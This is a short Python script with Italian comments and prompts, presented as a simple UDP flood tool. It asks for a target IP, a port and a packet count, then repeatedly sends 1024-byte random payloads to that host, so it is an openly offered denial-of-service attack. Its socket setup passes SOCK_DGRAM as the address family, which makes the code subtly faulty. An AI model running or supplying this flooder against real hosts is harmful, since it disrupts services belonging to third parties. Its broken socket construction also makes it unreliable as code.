#Semplice programma per effettuare un Flood UDP 

import random
import socket

HOST = input("Inserisci un indirizzo IP: \n")
PORT = int(input("Inserisci una porta: \n"))
packets = int(input("Inserire numero pacchetti: \n"))


#connection to the server
s = socket.socket(socket.SOCK_DGRAM)
s.connect ((HOST, PORT))

def atk_start():
    # packet generator
    pl = random._urandom(1024)
    i = 0
    while i < packets:
        s.sendto(pl, (HOST, PORT))
        print("Pacchetto inviato numero", i + 1)
        i += 1

    s.close()
    print("Attacco terminato")

atk_start()
